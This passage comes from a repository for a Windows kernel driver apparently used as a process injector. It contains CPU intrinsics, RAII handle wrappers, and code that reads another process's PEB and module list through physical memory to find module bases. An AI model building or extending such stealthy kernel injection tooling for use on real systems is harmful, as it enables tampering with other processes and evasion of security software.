                 :
                 : "memory");
    return (edx >> 26) & 1;
#else
    uint32_t eax, ebx, ecx, edx;
    asm volatile("movl $0x80000001, %%eax\n\t"
                 "cpuid"
                 : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
                 :
                 : "memory");
    return (edx >> 26) & 1;
#endif
  }

  /**
   * @brief Check if 5-level paging (LA57) is supported
   *
   * Queries CPUID function 7 (sub-function 0) to check for Linear Address 57-bit support.
   * LA57 extends virtual address space from 48 bits (256 TiB) to 57 bits (128 PiB)
   * by adding a fifth level to the page table hierarchy.
   *
   * @return true if 5-level paging is supported, false otherwise
   */
  bool supports_la57(void) {
#if defined(_MSC_VER) && !defined(__clang__)
    int cpuid_result[4];
    __cpuidex(cpuid_result, 7, 0);       // Function 7, sub-function 0
    return (cpuid_result[2] >> 16) & 1;  // ECX bit 16 = LA57
#elif defined(__clang__)
    uint32_t eax, ebx, ecx, edx;
    asm volatile("movl $7, %%eax\n\t"
                 "xorl %%ecx, %%ecx\n\t"  // Sub-function 0
                 "cpuid"
                 : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
                 :
                 : "memory");
    return (ecx >> 16) & 1;
#else
    uint32_t eax, ebx, ecx, edx;
    asm volatile("movl $7, %%eax\n\t"
                 "xorl %%ecx, %%ecx\n\t"
                 "cpuid"
                 : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
                 :
                 : "memory");
    return (ecx >> 16) & 1;
#endif
  }

  /**
   * @brief Invalidate a single page in the Translation Lookaside Buffer (TLB)
   *
   * The INVLPG instruction invalidates the TLB entry for the specified virtual address.
   * This forces the processor to reload the page table entry on the next access,
   * ensuring coherency after page table modifications.
   *
   * @param m Virtual memory address of the page to invalidate
   * @warning The memory clobber prevents compiler reordering that could cause race conditions
   */
  void invlpg(void* m) {
    /* Clobber memory to avoid optimizer re-ordering access before invlpg, which may cause nasty
     * bugs. */
#if defined(_MSC_VER) && !defined(__clang__)
    __invlpg(m);
#elif defined(__clang__)
    asm volatile("invlpg (%0)" : : "r"(m) : "memory");
#else
    asm volatile("invlpg (%0)" : : "r"(m) : "memory");
#endif
  }
}  // namespace intrin
```

`driver/utils/intrin.hpp`:

```hpp
#pragma once

/**
 * @brief Namespace containing intrinsic functions for low-level CPU operations
 *
 * This namespace provides cross-platform wrappers for CPU intrinsics and inline assembly,
 * supporting both MSVC and GCC/Clang compilers. All functions are intended for kernel-mode
 * or privileged code execution.
 */
namespace intrin {
#if defined(_MSC_VER) && !defined(__clang__)
  #include <intrin.h>
#endif

  /**
   * @brief Read the CR3 control register
   *
   * The CR3 register contains the physical address of the page directory base register (PDBR)
   * for the currently active page table. This is used by the Memory Management Unit (MMU)
   * for virtual-to-physical address translation.
   *
   * @return The current value of the CR3 register as a pointer-sized integer
   */
  uintptr_t readcr3(void);

  /**
   * @brief Get the maximum physical address width supported by the processor
   *
   * Executes CPUID with EAX=80000008h to query processor capabilities.
   * The returned value indicates how many bits are used for physical addressing.
   *
   * @return Number of physical address bits supported (typically 36, 39, 48, or 52)
   */
  uint32_t get_maxphyaddr(void);

  /**
   * @brief Check if the processor supports 1GB pages
   *
   * Queries CPUID function 80000001h to check for PDPE1GB support.
   * 1GB pages allow mapping large contiguous memory regions more efficiently
   * by reducing TLB pressure and page table overhead.
   *
   * @return true if 1GB pages are supported, false otherwise
   */
  bool supports_1gb_pages(void);

  /**
   * @brief Check if 5-level paging (LA57) is supported
   *
   * Queries CPUID function 7 (sub-function 0) to check for Linear Address 57-bit support.
   * LA57 extends virtual address space from 48 bits (256 TiB) to 57 bits (128 PiB)
   * by adding a fifth level to the page table hierarchy.
   *
   * @return true if 5-level paging is supported, false otherwise
   */
  bool supports_la57(void);

  /**
   * @brief Invalidate a single page in the Translation Lookaside Buffer (TLB)
   *
   * The INVLPG instruction invalidates the TLB entry for the specified virtual address.
   * This forces the processor to reload the page table entry on the next access,
   * ensuring coherency after page table modifications.
   *
   * @param m Virtual memory address of the page to invalidate
   * @warning The memory clobber prevents compiler reordering that could cause race conditions
   */
  void invlpg(void* m);

}  // namespace intrin
```

`driver/utils/raii.hpp`:

```hpp
#pragma once
#include <ntdef.h>
#include <ntifs.h>
#include "../def/ia32.hpp"
#include "../def/def.hpp"
#include "../mem/mem.hpp"
#include "../utils/utils.hpp"

namespace raii {
  // RAII wrapper for kernel memory
  class kernel_memory {
    void* ptr_;
    size_t size_;

    // prevent copying - private with empty definitions
    kernel_memory(const kernel_memory&) {}
    kernel_memory& operator=(const kernel_memory&) {
      return *this;
    }

  public:
    explicit kernel_memory(size_t size) : ptr_(nullptr), size_(size) {
      ptr_ = mem::allocate_independent_pages(size);
      log("RAII", "kernel_memory allocated: 0x%p, size: 0x%llx", ptr_, size_);
    }

    ~kernel_memory() {
      if (ptr_) {
        log("RAII", "kernel_memory freeing: 0x%p, size: 0x%llx", ptr_, size_);
        globals::mm_free_independent_pages(reinterpret_cast<uintptr_t>(ptr_), size_);
      }
    }

    void* get() const {
      return ptr_;
    }

    void* release() {
      void* temp = ptr_;
      if (ptr_) {
        log("RAII", "kernel_memory releasing ownership: 0x%p", ptr_);
        ptr_ = nullptr;
      }
      return temp;
    }

    bool is_valid() const {
      return ptr_ != nullptr;
    }
  };

  // RAII wrapper for process/thread references
  template <typename T>
  class kernel_object_ref {
    T* object_;
    const char* type_name_;

    // prevent copying - private with empty definitions
    kernel_object_ref(const kernel_object_ref&) {}
    kernel_object_ref& operator=(const kernel_object_ref&) {
      return *this;
    }

  public:
    explicit kernel_object_ref(T* obj = nullptr, const char* type = "object")
        : object_(obj), type_name_(type) {
      if (object_) {
        log("RAII", "kernel_object_ref<%s> acquired: 0x%p", type_name_, object_);
      }
    }

    ~kernel_object_ref() {
      if (object_) {
        log("RAII", "kernel_object_ref<%s> dereferencing: 0x%p", type_name_, object_);
        globals::obf_dereference_object(object_);
      }
    }

    T* get() const {
      return object_;
    }

    T* release() {
      T* temp = object_;
      if (object_) {
        log("RAII", "kernel_object_ref<%s> releasing ownership: 0x%p", type_name_, object_);
        object_ = nullptr;
      }
      return temp;
    }

    bool is_valid() const {
      return object_ != nullptr;
    }
  };

  // RAII wrapper for handles
  class kernel_handle {
    HANDLE handle_;

    // prevent copying - private with empty definitions
    kernel_handle(const kernel_handle&) {}
    kernel_handle& operator=(const kernel_handle&) {
      return *this;
    }

  public:
    explicit kernel_handle(HANDLE h = nullptr) : handle_(h) {
      if (handle_) {
        log("RAII", "kernel_handle acquired: 0x%p", handle_);
      }
    }

    ~kernel_handle() {
      if (handle_) {
        log("RAII", "kernel_handle closing: 0x%p", handle_);
        globals::zw_close(handle_);
      }
    }

    HANDLE get() const {
      return handle_;
    }
    HANDLE* address_of() {
      return &handle_;
    }

    HANDLE release() {
      HANDLE temp = handle_;
      if (handle_) {
        log("RAII", "kernel_handle releasing ownership: 0x%p", handle_);
        handle_ = nullptr;
      }
      return temp;
    }

    bool is_valid() const {
      return handle_ != nullptr;
    }
  };

  // convenience type aliases for common kernel objects
  using process_ref = kernel_object_ref<_KPROCESS>;
  using thread_ref = kernel_object_ref<_KTHREAD>;
}  // namespace raii
```

`driver/utils/utils.cpp`:

```cpp
#pragma once
#include "../def/globals.hpp"
#include "utils.hpp"
#include "../mem/validation.hpp"
#include "../mem/phys.hpp"
namespace utils {
  /**
   * @brief Retrieve the Windows build number of the current system
   * @return Windows build number (e.g., 22000 for Windows 11, 19041 for Windows
   * 10)
   *
   * Uses RtlGetVersion to obtain the current operating system version
   * information. Useful for implementing version-specific code paths and
   * compatibility checks.
   */
  auto get_windows_version() -> unsigned long {
    RTL_OSVERSIONINFOW ver = {0};
    ver.dwOSVersionInfoSize = sizeof(ver);
    globals::rtl_get_version(&ver);
    return ver.dwBuildNumber;
  }

  auto kva_shadow_enabled() -> bool {
    return *(char*)globals::ki_kva_shadow ? true : false;
  }

  /**
   * @brief Get the base address of a module loaded in a target process
   * @param pid Process ID of the target process
   * @param module_name Wide string name of the module to find (e.g.,
   * L"ntdll.dll") Pass empty string (L"") to get the main executable base
   * @return Base address of the module, or 0 if not found or on error
   *
   * Walks the target process's PEB and LDR structures using physical memory reads
   * to locate a specific module. Case-insensitive module name comparison.
   * Special behavior: empty module_name returns the first (main) module's base.
   */
  auto get_module_base(uintptr_t pid, LPCWSTR module_name) -> uintptr_t {
    PEPROCESS target_proc;
    uintptr_t base = 0;

    if (!NT_SUCCESS(globals::ps_lookup_process_by_process_id((HANDLE)pid, &target_proc)))
      return 0;

    // validate process is still active and acquire rundown protection
    if (!validation::validate_process_state(target_proc, static_cast<uint32_t>(pid))) {
      globals::obf_dereference_object(target_proc);
      return 0;
    }

    if (!validation::acquire_process_rundown_protection(target_proc, static_cast<uint32_t>(pid))) {
      globals::obf_dereference_object(target_proc);
      return 0;
    }

    // get PEB address
    PPEB peb_address = globals::ps_get_process_peb(target_proc);
    if (!peb_address) {
      validation::release_process_rundown_protection(target_proc);
      globals::obf_dereference_object(target_proc);
      return 0;
    }

    // read PEB using physical memory read
    PEB peb{};
    auto status = physical::read_process_memory(target_proc, reinterpret_cast<ULONG64>(peb_address),
                                                &peb, sizeof(PEB));
    if (!NT_SUCCESS(status) || !peb.Ldr || !peb.Ldr->Initialized) {
      validation::release_process_rundown_protection(target_proc);
      globals::obf_dereference_object(target_proc);
      return 0;
    }

    // check if module_name is empty (L"") - special case to get the main module
    bool get_first_module = (module_name[0] == L'\0');

    // only create Unicode string for comparison if we're not getting the first
    // module
    UNICODE_STRING module_name_unicode{};
    if (!get_first_module) {
      globals::rtl_init_unicode_string(&module_name_unicode, module_name);
    }

    // get LDR_DATA_TABLE_ENTRY for InLoadOrderModuleList
    PEB_LDR_DATA ldr_data{};
    status = physical::read_process_memory(target_proc, reinterpret_cast<ULONG64>(peb.Ldr),
                                           &ldr_data, sizeof(PEB_LDR_DATA));
    if (!NT_SUCCESS(status)) {
      validation::release_process_rundown_protection(target_proc);
      globals::obf_dereference_object(target_proc);
      return 0;
    }

    // get the first entry address
    PLIST_ENTRY current_entry = ldr_data.InLoadOrderModuleList.Flink;
    PLIST_ENTRY first_entry = current_entry;

    do {
      // read the current LDR_DATA_TABLE_ENTRY
      LDR_DATA_TABLE_ENTRY entry{};
      status =
          physical::read_process_memory(target_proc,
                                        reinterpret_cast<ULONG64>(CONTAINING_RECORD(
                                            current_entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks)),
                                        &entry, sizeof(LDR_DATA_TABLE_ENTRY));

      if (!NT_SUCCESS(status)) {
        log("ERROR", "failed to read LDR_DATA_TABLE_ENTRY, status: 0x%08X", status);
        break;
      }

      // return the first valid entry's base if empty wstring is passed
      if (get_first_module && entry.DllBase) {
        base = reinterpret_cast<uintptr_t>(entry.DllBase);
        break;
      }

      // otherwise, proceed with the module name comparison
      // read the module name
      WCHAR dll_name[256]{};
      if (entry.BaseDllName.Length > 0 && entry.BaseDllName.Buffer) {
        status = physical::read_process_memory(
            target_proc, reinterpret_cast<ULONG64>(entry.BaseDllName.Buffer), dll_name,
            min(entry.BaseDllName.Length, static_cast<USHORT>(sizeof(dll_name) - sizeof(WCHAR))));

        if (NT_SUCCESS(status)) {
          // create a UNICODE_STRING for comparison
          UNICODE_STRING dll_name_unicode{};
          dll_name_unicode.Length = entry.BaseDllName.Length;
          dll_name_unicode.MaximumLength = entry.BaseDllName.MaximumLength;
          dll_name_unicode.Buffer = dll_name;

          // compare and check if this is the module we're looking for
          if (globals::rtl_compare_unicode_string(&dll_name_unicode, &module_name_unicode, TRUE) ==
              0) {
            base = reinterpret_cast<uintptr_t>(entry.DllBase);
            break;
          }
        }
      }

      // read the next entry
      LIST_ENTRY next_entry{};
      status = physical::read_process_memory(target_proc, reinterpret_cast<ULONG64>(current_entry),
                                             &next_entry, sizeof(LIST_ENTRY));
      if (!NT_SUCCESS(status)) {
        log("ERROR", "failed to read next LIST_ENTRY, status: 0x%08X", status);
        break;
      }

      current_entry = next_entry.Flink;
    } while (current_entry != first_entry);

    validation::release_process_rundown_protection(target_proc);
    globals::obf_dereference_object(target_proc);
    return base;
  }
}  // namespace utils
```

`driver/utils/utils.hpp`:

```hpp
#pragma once

namespace utils {
  /**
   * @brief Retrieve the Windows build number of the current system
   * @return Windows build number (e.g., 22000 for Windows 11, 19041 for Windows
   * 10)
   *
   * Uses RtlGetVersion to obtain the current operating system version
   * information. Useful for implementing version-specific code paths and
   * compatibility checks.
   */
  auto get_windows_version() -> unsigned long;

  auto kva_shadow_enabled() -> bool;

  /**
   * @brief Get the base address of a module loaded in a target process
   * @param pid Process ID of the target process
   * @param module_name Wide string name of the module to find (e.g.,
   * L"ntdll.dll") Pass empty string (L"") to get the main executable base
   * @return Base address of the module, or 0 if not found or on error
   *
   * Walks the target process's PEB and LDR structures using physical memory reads
   * to locate a specific module. Case-insensitive module name comparison.
   * Special behavior: empty module_name returns the first (main) module's base.
   */
  auto get_module_base(uintptr_t pid, LPCWSTR module_name) -> uintptr_t;

}  // namespace utils
```

`injector.sln`:

```sln
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.10.35122.118
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "client", "client\\client.vcxproj", "{C39D3318-EA1D-4D09-BD0F-6FF09CDFFDA0}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "driver", "driver\\driver.vcxproj", "{4C4C54E5-C199-4146-B5D7-FDDC9FE74066}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{C39D3318-EA1D-4D09-BD0F-6FF09CDFFDA0}.Debug|x64.ActiveCfg = Debug|x64
		{C39D3318-EA1D-4D09-BD0F-6FF09CDFFDA0}.Debug|x64.Build.0 = Debug|x64
		{C39D3318-EA1D-4D09-BD0F-6FF09CDFFDA0}.Debug|x86.ActiveCfg = Debug|Win32
		{C39D3318-EA1D-4D09-BD0F-6FF09CDFFDA0}.Debug|x86.Build.0 = Debug|Win32
		{C39D3318-EA1D-4D09-BD0F-6FF09CDFFDA0}.Release|x64.ActiveCfg = Release|x64
		{C39D3318-EA1D-4D09-BD0F-6FF09CDFFDA0}.Release|x64.Build.0 = Release|x64
		{C39D3318-EA1D-4D09-BD0F-6FF09CDFFDA0}.Release|x86.ActiveCfg = Release|Win32
		{C39D3318-EA1D-4D09-BD0F-6FF09CDFFDA0}.Release|x86.Build.0 = Release|Win32
		{4C4C54E5-C199-4146-B5D7-FDDC9FE74066}.Debug|x64.ActiveCfg = Debug|x64
		{4C4C54E5-C199-4146-B5D7-FDDC9FE74066}.Debug|x64.Build.0 = Debug|x64
		{4C4C54E5-C199-4146-B5D7-FDDC9FE74066}.Debug|x86.ActiveCfg = Debug|Win32
		{4C4C54E5-C199-4146-B5D7-FDDC9FE74066}.Debug|x86.Build.0 = Debug|Win32
		{4C4C54E5-C199-4146-B5D7-FDDC9FE74066}.Release|x64.ActiveCfg = Release|x64
		{4C4C54E5-C199-4146-B5D7-FDDC9FE74066}.Release|x64.Build.0 = Release|x64
		{4C4C54E5-C199-4146-B5D7-FDDC9FE74066}.Release|x86.ActiveCfg = Release|Win32
		{4C4C54E5-C199-4146-B5D7-FDDC9FE74066}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {BBE4D068-6DDC-4B2D-8490-1F82AEA24B3E}
	EndGlobalSection
EndGlobal

```